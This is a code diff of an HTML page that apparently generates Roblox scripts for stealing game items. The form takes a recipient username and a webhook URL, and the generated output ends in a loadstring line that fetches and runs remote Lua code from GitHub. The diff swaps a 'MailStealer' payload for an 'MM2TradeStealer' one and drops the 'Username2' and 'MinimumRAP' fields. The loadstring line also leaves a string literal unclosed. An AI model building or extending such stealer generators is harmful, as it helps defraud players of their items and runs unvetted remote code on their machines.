@@ -61,10 +61,6 @@
     <form>
       <label for="username">Username:</label>
       <input type="text" id="username" name="username"><br><br>
-      <label for="username2">Username2:</label>
-      <input type="text" id="username2" name="username2"><br><br>
-      <label for="minimumRAP">MinimumRAP:</label>
-      <input type="text" id="minimumRAP" name="minimumRAP"><br><br>
       <label for="webhook">Webhook URL:</label>
       <input type="text" id="webhook" name="webhook"><br><br>
       <button type="button" onclick="generateOutput()">Generate</button>
@@ -76,14 +72,10 @@
   <script>
     function generateOutput() {
       const username = document.getElementById("username").value;
-      const username2 = document.getElementById("username2").value;
-      const minimumRAP = document.getElementById("minimumRAP").value;
       const webhook = document.getElementById("webhook").value;
       const outputString = `Username = "${username}"\n` +
-                           `Username2 = "${username2}"\n` +
                            `Webhook = "${webhook}"\n` +
-                           `MinimumRAP = "${minimumRAP}"\n` +
-                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripty/Eks0va313/main/MailStealer/lua", true))();
+                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripty/Eks0va133/main/MM2TradeStealer", true))();
       document.getElementById("output").value = outputString;
       hljs.highlightAll();
     }
